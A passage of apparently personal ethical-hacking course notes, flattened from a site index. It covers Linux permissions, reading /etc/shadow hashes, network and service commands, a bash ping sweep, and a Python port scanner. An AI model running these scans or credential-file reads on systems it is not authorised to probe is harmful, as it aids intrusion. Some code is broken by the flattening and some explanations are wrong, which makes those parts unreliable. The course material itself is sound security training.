the\u00a0<code>ls -la</code>\u00a0output, the permissions are displayed as a series of nine characters. The first character represents the file type (e.g.,\u00a0<code>-</code>\u00a0for a regular file,\u00a0<code>d</code>\u00a0for a directory). The next three characters represent the owner's permissions, followed by the group's permissions, and then the permissions for other users.</p> <p>For example, let's consider an\u00a0<code>ls -la</code>\u00a0output line:</p> <p>-rwxr-x--- 1 user group 4096 May 10 12:34 myfile.txt </p> <p>In this example, the permissions are broken down as follows:</p> <ul> <li><code>-rwxr-x---</code>: The first character indicates that it is a regular file. The following three characters (<code>rwx</code>) represent the owner's permissions (read, write, and execute). The next three characters (<code>r-x</code>) represent the group's permissions (read and execute). The last three characters (<code>---</code>) represent the permissions for other users (no permissions).</li> <li><code>1</code>: Indicates the number of hard links to the file.</li> <li><code>user</code>: Refers to the owner of the file.</li> <li><code>group</code>: Refers to the group assigned to the file.</li> <li><code>4096</code>: Indicates the file size in bytes.</li> <li><code>May 10 12:34</code>: Specifies the date and time of the last modification.</li> <li><code>myfile.txt</code>: Represents the name of the file.</li> </ul> <p>It's worth noting that if a permission is not granted for a particular entity, a hyphen (<code>-</code>) is displayed in its place. Additionally, the output can include additional information such as special permissions, ownership, and timestamps.  </p> <p>Here are explanations and examples of the commands mentioned in this video. Please note, Teachable blocks the mention of some of the sensitive paths shown in the video, so we cannot display them in text format here:</p> <p><code>chmod</code>\u00a0(Change Mode):</p> <ul> <li> <ul> <li>Explanation: Changes the permissions of a file or directory.</li> <li>Example: Running\u00a0<code>chmod +x script.sh</code>\u00a0would add the execute permission to the file \"script.sh\", allowing it to be executed as a script.</li> </ul> </li> </ul> <p><code>adduser</code>:</p> <ul> <li> <ul> <li>Explanation: Creates a new user account.</li> <li>Example: Running\u00a0<code>adduser john</code>\u00a0would create a new user account with the username \"john\" and prompt for additional user information.</li> </ul> </li> </ul> <p><code>su</code>\u00a0(Switch User):</p> <ul> <li> <ul> <li>Explanation: Allows a user to switch to another user account.</li> <li>Example: Running\u00a0<code>su jane</code>\u00a0would switch to the user account \"jane\" after entering the password for that account.</li> </ul> </li> </ul> <p><code>/etc/sudoers</code>:</p> <ul> <li> <ul> <li>Explanation: Displays the content of the \"/etc/sudoers\" file, which contains configuration information for the\u00a0<code>sudo</code>\u00a0command.</li> <li>Example: Running\u00a0<code>/etc/sudoers</code>\u00a0would display the configuration directives for\u00a0<code>sudo</code>\u00a0access and permissions.</li> </ul> </li> </ul> <p><code>sudo -l</code>:</p> <ul> <li> <ul> <li>Explanation: Lists the commands a user is allowed to run with\u00a0<code>sudo</code>\u00a0privileges.</li> <li>Example: Running\u00a0<code>sudo -l</code>\u00a0would display the commands and permissions available to the current user with\u00a0<code>sudo</code>\u00a0access.</li> </ul> </li> </ul> <p>Please note that some of these commands require administrative privileges, and caution should be exercised when modifying system files or working with user accounts.</p> <p>[! info] - d for directory (blue),file (white),link(light blue) - there 3 groups : owner of file, group membership, other users - create text file hello.txt ... see permissions(text file not have x :is it by default or not executable(by default may be for all new )) - use <code>chmod</code>  2 ways:  <pre><code>chmod +rwx hello.txt\nchmod 777 hello.txt\n</code></pre>  - <code>adduser , su , cat etc/passwd</code>(used inpast to store passwords , now are stored in shadow file in form of hashes (<code>sudo cat etc/shadow</code>)) - root not show its hash , but kali and john are shown .. even same password , they have different hash (only in linux )... - sudo <code>cat etc/sudoers</code> - grep 'sudo' <code>etc/group</code> - <code>sudo -l</code> (see comands i can run)</p>"},{"location":"4.Introduction%20to%20Linux/5.%20%20Common%20Network%20Commands/","title":"5.  Common Network Commands","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> <p><code>ip a</code>:</p> <ul> <li> <ul> <li>Explanation: Displays the network interfaces and their associated IP addresses.</li> <li>Example: Running\u00a0<code>ip a</code>\u00a0would show information about network interfaces, including their IP addresses, MAC addresses, and other details.</li> </ul> </li> </ul> <p><code>ifconfig</code>:</p> <ul> <li> <ul> <li>Explanation: Displays the configuration and status of network interfaces.</li> <li>Example: Running\u00a0<code>ifconfig</code>\u00a0would show the configuration details, including IP addresses, MAC addresses, and other information for active network interfaces.</li> </ul> </li> </ul> <p><code>iwconfig</code>:</p> <ul> <li> <ul> <li>Explanation: Displays the configuration and status of wireless network interfaces.</li> <li>Example: Running\u00a0<code>iwconfig</code>\u00a0would show the configuration details, such as wireless signal strength, frequency, and encryption information, for active wireless interfaces.</li> </ul> </li> </ul> <p><code>ip n</code>:</p> <ul> <li> <ul> <li>Explanation: Displays the Neighbor Table, which contains the IP-to-MAC address mappings for devices in the local network.</li> <li>Example: Running\u00a0<code>ip n</code>\u00a0would show the IP and MAC addresses of devices that have recently communicated with the current device.</li> </ul> </li> </ul> <p><code>arp -a</code>:</p> <ul> <li> <ul> <li>Explanation: Displays the ARP (Address Resolution Protocol) cache, which maps IP addresses to MAC addresses.</li> <li>Example: Running\u00a0<code>arp -a</code>\u00a0would show the IP and MAC addresses of devices that have been resolved recently by the ARP protocol.</li> </ul> </li> </ul> <p><code>ip r</code>:</p> <ul> <li> <ul> <li>Explanation: Displays the routing table, which contains information about network routes.</li> <li>Example: Running\u00a0<code>ip r</code>\u00a0would show the routing table, including destination networks, gateway IP addresses, and network interfaces.</li> </ul> </li> </ul> <p><code>route</code>:</p> <ul> <li> <ul> <li>Explanation: Displays or manipulates the IP routing table.</li> <li>Example: Running\u00a0<code>route</code>\u00a0would display the routing table, similar to the\u00a0<code>ip r</code>\u00a0command.</li> </ul> </li> </ul> <p><code>ping</code>:</p> <ul> <li> <ul> <li>Explanation: Sends ICMP echo requests to a specified IP address to check network connectivity and measure round-trip time.</li> <li>Example: Running\u00a0<code>ping 8.8.8.8</code>\u00a0would send ICMP echo requests to the IP address \"8.8.8.8\" (Google's DNS server) and display the round-trip time and packet loss statistics.</li> </ul> </li> </ul> <p>These commands are commonly used for network troubleshooting, configuration, and gathering network-related information in Linux systems.</p> <p>[! info] - <code>ip a</code> list all ; is new version of <code>ifconfig</code> (ethernet connections only) so <code>iwconfig</code> (wireless connections) - <code>ip n</code> and its alternative is <code>arp -a</code> (old)ARP says what ip address is associated with what mac address - <code>ip r</code> or <code>route</code> (old )  for routing table : where our traffic is routing (need to know how to add route and delete one ; segmented network?? ) - <code>ping</code> in windows we only see 4 packets ... here is infinite. for the machine to say i am here it uses icmp traffic(not all machine permits icmp traffic , so if it does not respond , does not mean it is not online  ) - <code>netstat</code> command to see open ports and services</p>"},{"location":"4.Introduction%20to%20Linux/6.Viewing%2C%20Creating%2C%20and%20Editing%20Files/","title":"6.Viewing, Creating, and Editing Files","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> <p><code>echo \"hello\" &gt; hey.txt</code>:</p> <ul> <li> <ul> <li>Explanation: Creates a new file named \"hey.txt\" with the content \"hello\" and overwrites the file if it already exists.</li> <li>Example: Running\u00a0<code>echo \"hello\" &gt; hey.txt</code>\u00a0would create a file named \"hey.txt\" and write the word \"hello\" into it.</li> </ul> </li> </ul> <p><code>echo \"hello again\" &gt;&gt; hey.txt</code>:</p> <ul> <li> <ul> <li>Explanation: Appends the content \"hello again\" to an existing file named \"hey.txt\" or creates a new file if it doesn't exist.</li> <li>Example: Running\u00a0<code>echo \"hello again\" &gt;&gt; hey.txt</code>\u00a0would append the text \"hello again\" to the end of the \"hey.txt\" file.</li> </ul> </li> </ul> <p><code>touch newfile.txt</code>:</p> <ul> <li> <ul> <li>Explanation: Creates a new empty file named \"newfile.txt\" or updates the timestamp of an existing file to the current time.</li> <li>Example: Running\u00a0<code>touch newfile.txt</code>\u00a0would create an empty file named \"newfile.txt\" if it doesn't exist or update its timestamp if it already exists.</li> </ul> </li> </ul> <p><code>nano newfile.txt</code>:</p> <ul> <li> <ul> <li>Explanation: Opens the text editor Nano and allows you to create or edit the content of a file named \"newfile.txt\".</li> <li>Example: Running\u00a0<code>nano newfile.txt</code>\u00a0would open the Nano editor, where you can enter or modify text in the \"newfile.txt\" file.</li> </ul> </li> </ul> <p><code>mousepad newfile.txt</code>:</p> <ul> <li> <ul> <li>Explanation: Opens the Mousepad text editor and allows you to create or edit the content of a file named \"newfile.txt\".</li> <li>Example: Running\u00a0<code>mousepad newfile.txt</code>\u00a0would open the Mousepad editor, where you can enter or modify text in the \"newfile.txt\" file.</li> </ul> </li> </ul> <p>These commands are commonly used for file manipulation and editing in Linux systems. The\u00a0<code>echo</code>\u00a0command is used to print text or variables to the terminal or redirect them to files. The\u00a0<code>touch</code>\u00a0command is used to create or update file timestamps. The\u00a0<code>nano</code>\u00a0and\u00a0<code>mousepad</code>\u00a0commands are text editors that allow you to create and modify files directly from the terminal.</p> <p>[! info] - <code>echo \"hello\" &gt; hey.txt</code> - <code>cat hey.txt</code> -  <code>echo \"hello again \" &gt; hey.txt</code> overwrites all what was - <code>echo \"hello again \" &gt;&gt; hey.txt</code> add info  - <code>touch newfile.txt</code> creates new file - text editor : <code>nano</code> , <code>vim</code> ,<code>vi</code> : <code>nano</code> better cuz easy - <code>nano newfile.txt</code> -  graphical notepad <code>mousepad newfile.txt</code> ; <code>mousepad</code> is latest and greatest (unlike <code>gedit</code>)  - <code>nano</code> and <code>mousepad</code> can create and edit files , not just edit an existing one . </p>"},{"location":"4.Introduction%20to%20Linux/7.%20%20Starting%20and%20Stopping%20Services/","title":"7.  Starting and Stopping Services","text":"<p>Here are explanations and examples of the commands mentioned in this video:</p> <p><code>sudo service apache2 start</code>:</p> <ul> <li> <ul> <li>Explanation: Starts the Apache web server service.</li> <li>Example: Running\u00a0<code>sudo service apache2 start</code>\u00a0would initiate the Apache web server and make it available for serving web pages.</li> </ul> </li> </ul> <p><code>sudo service apache2 stop</code>:</p> <ul> <li> <ul> <li>Explanation: Stops the Apache web server service.</li> <li>Example: Running\u00a0<code>sudo service apache2 stop</code>\u00a0would halt the running Apache web server, shutting down any active web page serving.</li> </ul> </li> </ul> <p><code>python3 -m http.server 80</code>:</p> <ul> <li> <ul> <li>Explanation: Starts a simple HTTP server using Python on port 80.</li> <li>Example: Running\u00a0<code>python3 -m http.server 80</code>\u00a0would start a basic HTTP server on port 80, allowing you to serve files from the current directory.</li> </ul> </li> </ul> <p><code>sudo systemctl enable ssh</code>:</p> <ul> <li> <ul> <li>Explanation: Enables the SSH (Secure Shell) service to start automatically on system boot.</li> <li>Example: Running\u00a0<code>sudo systemctl enable ssh</code>\u00a0would configure the system to start the SSH service during system startup.</li> </ul> </li> </ul> <p><code>sudo systemctl disable ssh</code>:</p> <ul> <li> <ul> <li>Explanation: Disables the SSH service from starting automatically on system boot.</li> <li>Example: Running\u00a0<code>sudo systemctl disable ssh</code>\u00a0would prevent the SSH service from starting automatically during system startup.</li> </ul> </li> </ul> <p>These commands are frequently used in Linux systems for managing services, starting and stopping processes, and enabling or disabling specific services at system startup. The\u00a0<code>sudo</code>\u00a0command is used to execute commands with superuser privileges. The\u00a0<code>service</code>\u00a0and\u00a0<code>systemctl</code>\u00a0commands are used to manage system services.</p> <p>[!Info] - start apache service :<code>sudo service apache2 start</code> host file for web or malicious . - using python :<code>python3 -m http.server 80</code> - service start with machine is powered on:<code>sudo systemctl enable ssh</code></p>"},{"location":"4.Introduction%20to%20Linux/8.%20%20Installing%20and%20Updating%20Tools/","title":"8.  Installing and Updating Tools","text":"<p>Here are explanations and e\\xamples of the commands mentioned in this video:</p> <p><code>sudo apt update &amp;&amp; sudo apt upgrade</code>:</p> <ul> <li> <ul> <li>Explanation: Updates the package lists and upgrades installed packages on a Debian-based Linux system using the APT package manager.</li> <li>Example: Running\u00a0<code>sudo apt update &amp;&amp; sudo apt upgrade</code>\u00a0would update the package lists to retrieve information about available updates, and then upgrade the installed packages to their latest versions.</li> </ul> </li> </ul> <p><code>sudo apt install cron-daemon-common</code>:</p> <ul> <li> <ul> <li>Explanation: Installs the \"cron-daemon-common\" package using APT. Cron is a time-based job scheduler in Linux systems, and the \"cron-daemon-common\" package provides common files and utilities for the cron daemon.</li> <li>Example: Running\u00a0<code>sudo apt install cron-daemon-common</code>\u00a0would download and install the \"cron-daemon-common\" package on the system.</li> </ul> </li> </ul> <p><code>sudo git clone\u00a0[https://github.com/Dewalt-arch/pimpmykali.git](https://github.com/Dewalt-arch/pimpmykali.git)</code>:</p> <ul> <li> <ul> <li>Explanation: Clones a Git repository from the specified URL using the Git version control system.</li> <li>Example: Running\u00a0<code>sudo git clone\u00a0[https://github.com/Dewalt-arch/pimpmykali.git](https://github.com/Dewalt-arch/pimpmykali.git)</code>\u00a0would clone the repository from the given URL and create a local copy of the repository's files and version history.</li> </ul> </li> </ul> <p>These commands are commonly used in Linux systems for updating packages, installing new software, and managing version-controlled repositories. The\u00a0<code>sudo</code>\u00a0command is used to execute commands with superuser privileges. The\u00a0<code>apt</code>\u00a0command is used for package management in Debian-based distributions. The\u00a0<code>git</code>\u00a0command is used for version control and working with Git repositories.</p> <p>[!info] - linux also need update (patching) <code>sudo apt update &amp;&amp; apt upgrade</code> (install : go to repositories::look through packages ; update ; update available) - <code>sudo su -</code> must be root to run some commands rather than sudo - updating can break things (so have no/have back up of your vm) - <code>sudo git clone</code>(pimpmykali)(after using :no to move kali folder what inside it ..to root folder)</p>"},{"location":"4.Introduction%20to%20Linux/9.%20%20Scripting%20with%20Bash/","title":"ping sweep","text":"<ul> <li>see online devices</li> </ul> <pre><code>#!/bin/bash\nif [ \"$1\" == \"\" ] \nthen \necho \"You forgot an IP address!\" \necho \"Syntax: ./ipsweep.sh 192.168.1\" \n\nelse\nfor ip in `seq 1 254`; do\nping -c 1 $1.$ip | grep \"64 bytes\" | cut -d \" \" -f 4 | tr -d \":\" &amp;\ndone \nfi\n</code></pre> <p>[!Question]  My bash script is producing an error with \u201cseq\u201d.\u00a0How do I resolve?</p> <p>[!success] Answer \u00a0Ensure use of backtick (`) instead of using single quote (').\u00a0Alternatively, use $(seq 1 254) instead of seq</p> <p>[!info] d \" \" : delimiter f : field seed or translate to get red of : hashbang : #!/bin/bash chmod +x ipsweep.sh &amp; run multiple things at once (simultaneous) rather than '';'' - one liner:one line statement : <code>for ip in $(cat ips.txt);do nmap $ip;done</code></p>"},{"location":"5.Introduction%20to%20Python/1.intro/","title":"1.intro","text":""},{"location":"5.Introduction%20to%20Python/10.Looping/","title":"10.Looping","text":"<p>In Python, looping allows you to repeat a block of code multiple times. It is a fundamental concept used for iterating over data structures, performing repetitive tasks, and controlling the flow of your program. There are two main types of loops in Python:\u00a0<code>for</code>\u00a0loops and\u00a0<code>while</code>\u00a0loops. Here's an explanation of looping in Python:</p> <ol> <li>for Loop:</li> <li>The\u00a0<code>for</code>\u00a0loop is used to iterate over a sequence (such as a list, tuple, string, or range) or any iterable object. It executes a block of code a fixed number of times, based on the elements or items in the sequence. Here's the general syntax:</li> </ol> <p>for item in sequence: \u00a0 \u00a0 # code to be executed for each item in the sequence</p> <p>Example:</p> <p>fruits = [\"apple\", \"banana\", \"orange\"] for fruit in fruits: \u00a0 \u00a0 print(fruit)</p> <p>In this example, the\u00a0<code>for</code>\u00a0loop iterates over each item in the\u00a0<code>fruits</code>\u00a0list, and the block of code inside the loop (<code>print(fruit)</code>) is executed for each item. It will output:</p> <p>apple banana orange</p> <ol> <li>while Loop:</li> <li>The\u00a0<code>while</code>\u00a0loop is used to repeatedly execute a block of code as long as a given condition is true. It continues looping until the condition becomes false. Here's the general syntax:</li> </ol> <p>while condition: \u00a0 \u00a0 # code to be executed while the condition is true</p> <p>Example:</p> <p>count = 0 while count &lt; 5: \u00a0 \u00a0 print(count) \u00a0 \u00a0 count += 1</p> <p>In this example, the\u00a0<code>while</code>\u00a0loop will continue executing the code inside the loop (<code>print(count)</code>) as long as the condition\u00a0<code>count &lt; 5</code>\u00a0is true. It will output:</p> <p>0 1 2 3 4</p> <p>The\u00a0<code>break</code>\u00a0and\u00a0<code>continue</code>\u00a0Statements:</p> <p>Within loops, you can use the\u00a0<code>break</code>\u00a0statement to exit the loop prematurely and the\u00a0<code>continue</code>\u00a0statement to skip the current iteration and move to the next one.</p> <p>Looping provides a powerful mechanism for iterating over data, performing calculations, and controlling program flow. By using loops effectively, you can automate repetitive tasks and process large amounts of data efficiently.  </p> <p>PYTHON</p> <p>```python</p>"},{"location":"5.Introduction%20to%20Python/10.Looping/#for-loops-start-to-finish-of-an-iterate","title":"For loops - start to finish of an iterate","text":"<p>vegetables = [\"cucumber\", \"spinach\", \"cabbage\"] for x in vegetables: print(x) #While loops - execute as long as </p> <p>true i = 1  while i &lt; 10:     print(i) i += 1     ```</p>"},{"location":"5.Introduction%20to%20Python/11.%20%20Advanced%20Strings/","title":"11.  Advanced Strings","text":"<p>In Python, the\u00a0<code>str</code>\u00a0(string) data type represents a sequence of characters enclosed within single quotes (' ') or double quotes (\" \"). Strings in Python are immutable, which means they cannot be changed after they are created. Here are some key points about strings in Python:</p> <p>Creation:</p> <ul> <li> <ul> <li>Example:\u00a0<code>my_string = 'Hello, World!'</code>\u00a0or\u00a0<code>my_string = \"Hello, World!\"</code></li> </ul> </li> </ul> <p>Accessing Characters:</p> <ul> <li> <ul> <li>You can access individual characters within a string using indexing, starting from 0.</li> <li>Example:\u00a0<code>print(my_string[0])</code>\u00a0would output 'H'.</li> </ul> </li> </ul> <p>String Concatenation:</p> <ul> <li> <ul> <li>You can concatenate (join) two or more strings using the\u00a0<code>+</code>\u00a0operator.</li> <li>Example:\u00a0<code>greeting = 'Hello' + ' ' + 'World!'</code>\u00a0would result in 'Hello World!'.</li> </ul> </li> </ul> <p>String Length:</p> <ul> <li> <ul> <li>The\u00a0<code>len()</code>\u00a0function can be used to determine the length (number of characters) of a string.</li> <li>Example:\u00a0<code>print(len(my_string))</code>\u00a0would output the length of the string.</li> </ul> </li> </ul> <p>String Slicing:</p> <ul> <li> <ul> <li>You can extract a substring from a string using slicing, specifying the start and end indices.</li> <li>Example:\u00a0<code>substring = my_string[7:12]</code>\u00a0would extract the substring 'World'.</li> </ul> </li> </ul> <p>String Methods:</p> <ul> <li> <ul> <li>Python provides various built-in methods to manipulate and transform strings. Examples include\u00a0<code>upper()</code>,\u00a0<code>lower()</code>,\u00a0<code>strip()</code>,\u00a0<code>split()</code>,\u00a0<code>replace()</code>, and more.</li> <li>Example:\u00a0<code>print(my_string.upper())</code>\u00a0would output 'HELLO, WORLD!'.</li> </ul> </li> </ul> <p>String Formatting:</p> <ul> <li> <ul> <li>String formatting allows you to embed values within a string. This can be done using the\u00a0<code>%</code>\u00a0operator or the\u00a0<code>format()</code>\u00a0method.</li> </ul> </li> <li>Example:</li> </ul> <p>name = 'Alice' age = 30 print(\"My name is %s and I'm %d years old.\" % (name, age))</p>"},{"location":"5.Introduction%20to%20Python/11.%20%20Advanced%20Strings/#output-my-name-is-alice-and-im-30-years-old","title":"Output: My name is Alice and I'm 30 years old.","text":"<p>These are just a few key concepts related to strings in Python. Strings in Python are versatile and support a wide range of operations and manipulations.  </p> <p>PYTHON</p> <pre><code>#ADVANCED STRINGS \nmy_name = \"Heath\" print(my_name[0]) \n#first letter \nprint(my_name[-1]) \n#last letter \nsentence = \"This is a sentence.\" \nprint(sentence[:4]) \nprint(sentence.split()) \n#delimeter - default is a space \nsentence_split = sentence.split()\nsentence_join = ' '.join(sentence_split) print(sentence_join) \nquote = \"He said, 'give me all your money'\" - show example quote = \"He said, \\\"give me all your money\\\"\" \nprint(quote) too_much_space = \" hello \" print(too_much_space.strip()) \nprint(\"A\" in \"Apple\")\n#returns true \nprint(\"a\" in \"Apple\") \n#returns false - case sensitive \nletter = \"A\"\nword = \"Apple\" \nprint(letter.lower() in word.lower())\n#improved\nmovie = \"The Hangover\" \nprint(\"My favorite movie is {}.\".format(movie)) \nprint(\"My favorite movie is %s\" % movie) \nprint(f\"My favorite movie is {movie}\")\n</code></pre>"},{"location":"5.Introduction%20to%20Python/12.Dictionaries/","title":"12.Dictionaries","text":"<p>In Python, a dictionary is an unordered collection of key-value pairs. It is a versatile and powerful data structure that allows you to store, retrieve, and manipulate data based on unique keys. Here's an explanation of dictionaries in Python:</p> <p>Dictionary Creation:</p> <p>To create a dictionary, you enclose key-value pairs within curly braces\u00a0<code>{ }</code>, separating each pair with a colon\u00a0<code>:</code>. Here's an example:</p> <p>student = { \u00a0 \u00a0 \"name\": \"Alice\", \u00a0 \u00a0 \"age\": 20, \u00a0 \u00a0 \"major\": \"Computer Science\" }</p> <p>Dictionary Access:</p> <p>You can access the values in a dictionary by referring to their corresponding keys. Keys provide a way to uniquely identify and retrieve values. Here's an example:</p> <p>print(student[\"name\"])\u00a0 \u00a0# Output: \"Alice\" print(student[\"age\"])\u00a0 \u00a0 # Output: 20</p> <p>Dictionary Modification:</p> <p>Dictionaries are mutable, which means you can modify their values by assigning new values to specific keys. Here's an example:</p> <p>student[\"age\"] = 21\u00a0 \u00a0 \u00a0 \u00a0# Modifying a value student[\"city\"] = \"London\"\u00a0 \u00a0 # Adding a new key-value pair</p> <p>Dictionary Operations:</p> <p>Python provides various operations that can be performed on dictionaries. Some common operations include:</p> <ul> <li>Length: The\u00a0<code>len()</code>\u00a0function returns the number of key-value pairs in a dictionary.</li> <li>Iteration: You can iterate over the keys, values, or key-value pairs of a dictionary using loops.</li> <li>Deletion: You can remove a key-value pair from a dictionary using the\u00a0<code>del</code>\u00a0keyword.</li> </ul> <p>Here are some examples:</p> <p>student = { \u00a0 \u00a0 \"name\": \"Alice\", \u00a0 \u00a0 \"age\": 20, \u00a0 \u00a0 \"major\": \"Computer Science\" }</p> <p>print(len(student))\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 # Output: 3</p> <p>for key in student: \u00a0 \u00a0 print(key, student[key])\u00a0 # Output: \"name Alice\", \"age 20\", \"major Computer Science\"</p> <p>del student[\"age\"]\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0# Deleting a key-value pair</p> <p>Dictionaries are powerful data structures that provide a flexible way to store and retrieve data based on keys. They are commonly used for organizing and manipulating data that requires quick and efficient access.  </p> <p>PYTHON</p> <pre><code>#DICTIONARIES - key/value pairs {} \ndrinks = {\"White Russian\": 7, \"Old Fashion\": 10, \"Lemon Drop\": 8} \n#drink is key, price is value print(drinks)\nemployees = {\"Finance\": [\"Bob\", \"Linda\", \"Tina\"], \"IT\": [\"Gene\", \"Louise\", \"Teddy\"], \"HR\": [\"Jimmy Jr.\", \"Mort\"]} employees['Legal'] = [\"Mr. Frond\"] \n#adds new key:value pair \nprint(employees) employees.update({\"Sales\": [\"Andie\", \"Ollie\"]}) \n#adds new key:value pair \nprint(employees) \ndrinks['White Russian'] = 8 \nprint(drinks) \nprint(drinks.get(\"White Russian\"))\n</code></pre>"},{"location":"5.Introduction%20to%20Python/13.%20%20Importing%20Modules/","title":"13.  Importing Modules","text":"<p>In Python, importing modules allows you to access and use code that resides in external Python files or libraries. Modules are a way to organize and reuse code, making it easier to manage and maintain large projects. Here's an explanation of importing modules in Python:</p> <ol> <li>Importing Entire Modules:</li> <li>To import an entire module, you use the\u00a0<code>import</code>\u00a0keyword followed by the module name. Here's an example:</li> </ol> <p>import math</p> <p>result = math.sqrt(25) print(result)\u00a0 \u00a0# Output: 5.0</p> <p>In this example, the\u00a0<code>math</code>\u00a0module is imported, and the\u00a0<code>sqrt()</code>\u00a0function from the module is used to calculate the square root of 25.</p> <ol> <li>Importing Specific Functions or Variables:</li> <li>If you only need to use specific functions or variables from a module, you can import them directly. Here's an example:</li> </ol> <p>from math import sqrt</p> <p>result = sqrt(25) print(result)\u00a0 \u00a0# Output: 5.0</p> <p>In this case, only the\u00a0<code>sqrt()</code>\u00a0function is imported from the\u00a0<code>math</code>\u00a0module, so you can use it directly without prefixing it with the module name.</p> <ol> <li>Importing Modules with an Alias:</li> <li>You can also import a module and give it an alias using the\u00a0<code>as</code>\u00a0keyword. This can be helpful when dealing with modules with long names or to avoid naming conflicts. Here's an example:</li> </ol> <p>import math as m</p> <p>result = m.sqrt(25) print(result)\u00a0 \u00a0# Output: 5.0</p> <p>In this example, the\u00a0<code>math</code>\u00a0module is imported and assigned the alias\u00a0<code>m</code>, so you can use\u00a0<code>m.sqrt()</code>\u00a0instead of\u00a0<code>math.sqrt()</code>.</p> <ol> <li>Importing All Functions and Variables:</li> <li>If you want to import all functions and variables from a module, you can use the\u00a0<code>*</code>\u00a0wildcard character. However, it is generally recommended to import only what you need to avoid namespace pollution. Here's an example:</li> </ol> <p>from math import *</p> <p>result = sqrt(25) print(result)\u00a0 \u00a0# Output: 5.0</p> <p>In this case, all functions and variables from the\u00a0<code>math</code>\u00a0module are imported directly, allowing you to use them without prefixing with the module name.</p> <p>Importing modules enables you to access and utilize a wide range of functionality provided by the Python standard library or third-party libraries. It promotes code reusability, modularity, and maintainability in your Python programs.  </p> <pre><code>#IMPORTING - Importing is important. \nimport sys #system functions and parameters \nfrom datetime import datetime as dt #import with alias \n\nprint(sys.version)\nprint(dt.now())\n</code></pre>"},{"location":"5.Introduction%20to%20Python/14.%20Sockets/","title":"14. Sockets","text":"<p>In Python, sockets are a fundamental networking concept used for communication between computers over a network. Sockets enable programs to establish connections, send data, and receive data over various network protocols, such as TCP (Transmission Control Protocol) and UDP (User Datagram Protocol). Here's an explanation of sockets in Python:</p> <p>Socket Creation:</p> <p>To use sockets in Python, you need to import the\u00a0<code>socket</code>\u00a0module. You can create a socket object using the\u00a0<code>socket.socket()</code>\u00a0function, which takes two parameters: the address family (e.g.,\u00a0<code>socket.AF_INET</code>\u00a0for IPv4) and the socket type (e.g.,\u00a0<code>socket.SOCK_STREAM</code>\u00a0for TCP or\u00a0<code>socket.SOCK_DGRAM</code>\u00a0for UDP). Here's an example:</p> <p>import socket</p>"},{"location":"5.Introduction%20to%20Python/14.%20Sockets/#create-a-tcp-socket","title":"Create a TCP socket","text":"<p>tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>"},{"location":"5.Introduction%20to%20Python/14.%20Sockets/#create-a-udp-socket","title":"Create a UDP socket","text":"<p>udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</p> <p>Socket Communication:</p> <p>Once you have a socket object, you can use various methods to establish connections, send data, and receive data. Here are some commonly used methods:</p> <ul> <li><code>socket.connect(address)</code>: Establishes a connection to a remote address.</li> <li><code>socket.bind(address)</code>: Binds the socket to a specific address and port.</li> <li><code>socket.listen(backlog)</code>: Listens for incoming connections on a TCP socket.</li> <li><code>socket.accept()</code>: Accepts an incoming connection and returns a new socket object for communication.</li> <li><code>socket.send(data)</code>: Sends data over the socket.</li> <li><code>socket.recv(buffer_size)</code>: Receives data from the socket.</li> </ul> <p>Here's an example of a basic TCP server that listens for incoming connections:</p> <p>import socket</p>"},{"location":"5.Introduction%20to%20Python/14.%20Sockets/#create-a-tcp-socket_1","title":"Create a TCP socket","text":"<p>server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>"},{"location":"5.Introduction%20to%20Python/14.%20Sockets/#bind-the-socket-to-a-specific-address-and-port","title":"Bind the socket to a specific address and port","text":"<p>server_address = ('localhost', 1234) server_socket.bind(server_address)</p>"},{"location":"5.Introduction%20to%20Python/14.%20Sockets/#listen-for-incoming-connections","title":"Listen for incoming connections","text":"<p>server_socket.listen(5)</p> <p>while True: \u00a0 \u00a0 # Accept a client connection \u00a0 \u00a0 client_socket, client_address = server_socket.accept()</p> <p># Receive and send data \u00a0 \u00a0 data = client_socket.recv(1024) \u00a0 \u00a0 client_socket.send(b\"Received: \" + data)</p> <p># Close the client socket \u00a0 \u00a0 client_socket.close()</p> <p>Socket programming in Python allows you to create client-server applications, networked applications, and perform various networking tasks. It provides a powerful and flexible way to communicate over networks using different protocols. The\u00a0<code>socket</code>\u00a0module in Python provides a wide range of functions and methods to handle network communication efficiently.  </p> <pre><code>#SOCKETS - Sockets can be used to connect two nodes together. \n#!/bin/python3 \nimport socket \n\nHOST = '127.0.0.1' \nPORT = 7777 \n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #af_inet is ipv4, sock stream is a port \ns.connect((HOST,PORT))\n</code></pre>"},{"location":"5.Introduction%20to%20Python/15.%20%20Building%20a%20Port%20Scanner/","title":"15.  Building a Port Scanner","text":"<pre><code>#!/bin/python3 \nimport sys \nimport socket \nfrom datetime import datetime \n#Define our target \nif len(sys.argv) == 2: \n    target = socket.gethostbyname(sys.argv[1]) #Translate hostname to IPv4 \nelse: \n    print(\"Invalid amount of arguments.\") print(\"Syntax:   python3 scanner.py\") \n\n#Add a pretty banner \nprint(\"-\" * 50) \nprint(\"Scanning target \"+target) \nprint(\"Time started: \"+str(datetime.now()))\nprint(\"-\" * 50) \ntry: \n    for port in range(50,85): \n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)      socket.setdefaulttimeout(1) \n    result =s.connect_ex((target,port)) #returns an error indicator - if port is open it throws a 0, otherwise 1 \n    if result == 0: \n        print(\"Port {} is open\".format(port)) \n    s.close() \n\nexcept KeyboardInterrupt: \n    print(\"\\nExiting program.\") \n    sys.exit()\n\nexcept socket.gaierror: \n    print(\"Hostname could not be resolved.\") sys.exit()\n\nexcept socket.error: \n    print(\"Could not connect to server.\") \n    sys.exit()\n</code></pre>"},{"location":"5.Introduction%20to%20Python/16.%20%20User%20Input/","title":"16.  User Input","text":"<p>In Python, you can interact with the user and receive input using the\u00a0<code>input()</code>\u00a0function. The\u00a0<code>input()</code>\u00a0function allows you to prompt the user for input and receive the input as a string. Here's an explanation of user input in Python:</p> <p>name = input(\"Enter your name: \") print(\"Hello, \" + name + \"!\")</p> <p>In this example, the\u00a0<code>input()</code>\u00a0function is used to prompt the user to enter their name. The message \"Enter your name: \" is displayed to the user as a prompt. The user can then type their name and press Enter. The input provided by the user is stored in the variable\u00a0<code>name</code>, and the program prints a greeting using the entered name.</p> 